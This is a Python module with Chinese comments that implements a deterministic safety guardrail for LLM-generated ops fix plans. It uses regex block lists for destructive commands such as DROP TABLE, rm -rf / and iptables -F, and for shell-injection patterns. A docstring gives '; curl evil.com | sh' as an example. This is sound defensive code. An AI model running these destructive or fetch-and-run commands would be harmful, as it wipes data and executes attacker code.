"""
确定性安全护栏（Guardrail）

用确定性代码规则约束 LLM 输出边界，不依赖 LLM 自评。
这是生产级 Agent 系统的标配模式。

检查规则：
1. 危险命令黑名单：DROP TABLE、rm -rf、kill -9、DELETE FROM 不带 WHERE 等
2. 回滚完整性：高风险步骤必须有回滚命令
3. 步骤顺序合理性：先停服务再改配置，不能反过来
4. 命令注入检测：防止 LLM 生成恶意 shell 注入

设计原则：
- 每条规则是纯函数，输入步骤列表，输出违规列表
- 规则之间独立，可单独测试
- 输出是确定性的 pass/fail + 具体违规项，不是 LLM 猜的分数
"""

import re
from datetime import datetime, timezone
from typing import Optional
from schemas import GuardrailViolation, GuardrailResult
from logger import logger


# ============================================================
# 规则 1：危险命令黑名单
# ============================================================

# 每条规则：(正则模式, 规则ID, 严重程度, 描述)
DANGEROUS_COMMAND_PATTERNS = [
    # 数据库破坏性操作
    (r"\bDROP\s+TABLE\b", "DANGEROUS_CMD_001", "critical", "包含 DROP TABLE 操作，将永久删除表数据"),
    (r"\bDROP\s+DATABASE\b", "DANGEROUS_CMD_002", "critical", "包含 DROP DATABASE 操作，将永久删除数据库"),
    (r"\bTRUNCATE\s+TABLE\b", "DANGEROUS_CMD_003", "critical", "包含 TRUNCATE TABLE 操作，将清空表数据"),
    (r"\bDELETE\s+FROM\b(?!.*\bWHERE\b)", "DANGEROUS_CMD_004", "critical", "DELETE FROM 不带 WHERE 条件，将删除全表数据"),
    # 文件系统破坏性操作
    (r"\brm\s+-rf\s+/", "DANGEROUS_CMD_005", "critical", "rm -rf / 将递归删除根目录，极其危险"),
    (r"\brm\s+-rf\s+~", "DANGEROUS_CMD_006", "critical", "rm -rf ~ 将递归删除用户主目录"),
    (r"\brm\s+-rf\s+\*", "DANGEROUS_CMD_007", "critical", "rm -rf * 将递归删除当前目录所有文件"),
    # 进程强制终止
    (r"\bkill\s+-9\s+1\b", "DANGEROUS_CMD_008", "critical", "kill -9 1 将强制终止 init 进程，可能导致系统崩溃"),
    (r"\bkillall\s+-9\b", "DANGEROUS_CMD_009", "critical", "killall -9 将强制终止所有匹配进程"),
    # 权限变更
    (r"\bchmod\s+777\s+/", "DANGEROUS_CMD_010", "critical", "chmod 777 / 将根目录权限设为全开放，严重安全隐患"),
    (r"\bchown\s+.*\s+/", "DANGEROUS_CMD_011", "warning", "chown 修改根目录所有者，可能影响系统安全"),
    # 网络危险操作
    (r"\biptables\s+-F\b", "DANGEROUS_CMD_012", "critical", "iptables -F 将清空所有防火墙规则"),
]


def check_dangerous_commands(steps: list[dict]) -> list[GuardrailViolation]:
    """
    检查步骤中是否包含危险命令

    原理：对每个步骤的 command 字段做正则匹配，
    命中任何一条黑名单模式就记录一条违规。
    这是确定性的——同样的输入永远得到同样的输出。

    Args:
        steps: 修复步骤列表，每个步骤含 step_id, command, risk_level 等字段

    Returns:
        违规列表，空列表表示无违规
    """
    violations = []
    for step in steps:
        command = step.get("command", "")
        if not command:
            continue
        for pattern, rule_id, severity, description in DANGEROUS_COMMAND_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                violations.append(GuardrailViolation(
                    rule_id=rule_id,
                    severity=severity,
                    step_id=step.get("step_id"),
                    message=description,
                    detail=f"步骤 {step.get('step_id', '?')} 命令匹配危险模式: {command}",
                ))
    return violations


# ============================================================
# 规则 2：回滚完整性检查
# ============================================================

def check_rollback_completeness(steps: list[dict]) -> list[GuardrailViolation]:
    """
    检查高风险步骤是否有回滚命令

    原理：运维铁律——高风险操作必须有回滚方案。
    遍历所有步骤，risk_level 为 high 或 medium 的步骤
    如果 rollback_command 为空或无效，就记录违规。

    为什么不用 LLM 做这个检查？
    因为"有没有回滚命令"是事实判断，不是语义判断，
    确定性代码 100% 准确，LLM 可能漏判。

    Args:
        steps: 修复步骤列表

    Returns:
        违规列表
    """
    violations = []
    for step in steps:
        risk = step.get("risk_level", "low").lower()
        if risk in ("high", "medium"):
            rollback = step.get("rollback_command", "")
            if not rollback or rollback.strip() in ("", "none", "N/A", "无"):
                violations.append(GuardrailViolation(
                    rule_id="ROLLBACK_001",
                    severity="critical" if risk == "high" else "warning",
                    step_id=step.get("step_id"),
                    message=f"风险等级为 {risk} 的步骤缺少回滚命令",
                    detail=f"步骤 {step.get('step_id', '?')} (risk={risk}) 缺少有效的 rollback_command",
                ))
    return violations


# ============================================================
# 规则 3：步骤顺序合理性检查
# ============================================================

# 定义顺序约束：(先决动作关键词, 后续动作关键词, 规则ID, 描述)
# 含义：如果步骤列表中同时出现了"先决动作"和"后续动作"，
# 那么先决动作的步骤编号必须小于后续动作的步骤编号
STEP_ORDER_CONSTRAINTS = [
    (r"\b(stop|shutdown|kill|systemctl\s+stop)\b",
     r"\b(start|restart|systemctl\s+start|systemctl\s+restart)\b",
     "ORDER_001",
     "应先停止服务再启动，但启动步骤在停止步骤之前"),
    (r"\b(stop|shutdown|systemctl\s+stop)\b",
     r"\b(edit|modify|sed|vi|vim|nano|echo\s+.*>\s+)\b",
     "ORDER_002",
     "应先停止服务再修改配置，但修改配置步骤在停止服务之前"),
    (r"\b(backup|cp\s+)\b",
     r"\b(rm\s|delete|DROP|TRUNCATE)\b",
     "ORDER_003",
     "应先备份再删除，但删除步骤在备份步骤之前"),
]


def check_step_order(steps: list[dict]) -> list[GuardrailViolation]:
    """
    检查步骤顺序是否合理

    原理：定义一组顺序约束（先A后B），遍历步骤列表，
    如果发现 B 出现在 A 之前，就记录违规。

    举例：先停服务再改配置——如果步骤3是改配置，步骤5才是停服务，
    那就违规了。这是运维常识，用代码写死比让 LLM 判断可靠得多。

    Args:
        steps: 修复步骤列表（需按 step_id 排序）

    Returns:
        违规列表
    """
    violations = []
    sorted_steps = sorted(steps, key=lambda s: s.get("step_id", 0))

    for prereq_pattern, subsequent_pattern, rule_id, description in STEP_ORDER_CONSTRAINTS:
        prereq_step_id = None
        subsequent_step_id = None

        for step in sorted_steps:
            command = step.get("command", "")
            step_id = step.get("step_id", 0)

            if prereq_step_id is None and re.search(prereq_pattern, command, re.IGNORECASE):
                prereq_step_id = step_id
            if subsequent_step_id is None and re.search(subsequent_pattern, command, re.IGNORECASE):
                subsequent_step_id = step_id

        # 两个动作都存在，但后续动作出现在先决动作之前
        if prereq_step_id is not None and subsequent_step_id is not None:
            if subsequent_step_id < prereq_step_id:
                violations.append(GuardrailViolation(
                    rule_id=rule_id,
                    severity="warning",
                    step_id=subsequent_step_id,
                    message=description,
                    detail=f"先决动作在步骤 {prereq_step_id}，但后续动作在步骤 {subsequent_step_id}",
                ))

    return violations


# ============================================================
# 规则 4：命令注入检测
# ============================================================

# 常见的 shell 注入模式
INJECTION_PATTERNS = [
    (r";\s*curl\s+.*\|\s*sh\b", "INJECT_001", "critical", "检测到管道注入：通过 curl 下载并执行远程脚本"),
    (r";\s*wget\s+.*\|\s*(ba)?sh\b", "INJECT_002", "critical", "检测到管道注入：通过 wget 下载并执行远程脚本"),
    (r"\$\(\s*.*\)", "INJECT_003", "warning", "检测到命令替换 $()，可能包含恶意命令"),
    (r"`[^`]+`", "INJECT_004", "warning", "检测到反引号命令替换，可能包含恶意命令"),
    (r"\b(eval|exec)\s+", "INJECT_005", "warning", "检测到 eval/exec 调用，可能执行动态命令"),
]


def check_command_injection(steps: list[dict]) -> list[GuardrailViolation]:
    """
    检查步骤中是否包含命令注入风险

    原理：LLM 生成的命令可能包含 shell 注入模式，
    比如 ; curl evil.com | sh 这种管道注入。
    用正则匹配常见注入模式，命中就告警。

    注意：warning 级别的匹配（如 $() 命令替换）不一定是恶意的，
    但在生产环境中应该人工确认。

    Args:
        steps: 修复步骤列表

    Returns:
        违规列表
    """
    violations = []
    for step in steps:
        command = step.get("command", "")
        if not command:
            continue
        for pattern, rule_id, severity, description in INJECTION_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                violations.append(GuardrailViolation(
                    rule_id=rule_id,
                    severity=severity,
                    step_id=step.get("step_id"),
                    message=description,
                    detail=f"步骤 {step.get('step_id', '?')} 命令匹配注入模式: {command}",
                ))
    return violations


# ============================================================
# 护栏主入口
# ============================================================

def run_guardrail(fix_plan: dict) -> GuardrailResult:
    """
    执行全部护栏检查

    流程：
    1. 从 fix_plan 中提取 steps 列表
    2. 依次执行 4 条确定性规则
    3. 汇总所有违规，只要有一条 critical 级别违规就不通过
    4. 返回 GuardrailResult（passed/failed + 违规列表）

    关键设计：
    - 规则之间独立，新增规则只需加一个 check_xxx 函数
    - 输出是确定性的，同样的 fix_plan 永远得到同样的结果
    - 不依赖 LLM，不依赖外部服务，纯本地计算

    Args:
        fix_plan: FixAgent 生成的修复方案字典，含 steps 列表

    Returns:
        GuardrailResult: 通过/未通过 + 违规详情
    """
    steps = fix_plan.get("steps", [])

    if not steps:
        return GuardrailResult(
            passed=True,
            violations=[],
            checked_at=datetime.now(timezone.utc).isoformat(),
        )

    all_violations = []

    # 依次执行 4 条规则
    all_violations.extend(check_dangerous_commands(steps))
    all_violations.extend(check_rollback_completeness(steps))
    all_violations.extend(check_step_order(steps))
    all_violations.extend(check_command_injection(steps))

    # 只要有 critical 级别违规就不通过
    has_critical = any(v.severity == "critical" for v in all_violations)

    result = GuardrailResult(
        passed=not has_critical,
        violations=all_violations,
        checked_at=datetime.now(timezone.utc).isoformat(),
    )

    if result.passed:
        logger.info(f"[Guardrail] 检查通过，共 {len(all_violations)} 条 warning")
    else:
        critical_count = sum(1 for v in all_violations if v.severity == "critical")
        warning_count = sum(1 for v in all_violations if v.severity == "warning")
        logger.warning(
            f"[Guardrail] 检查未通过: {critical_count} 条 critical, "
            f"{warning_count} 条 warning"
        )
        for v in all_violations:
            logger.warning(f"  [{v.severity}] {v.rule_id}: {v.message}")

    return result
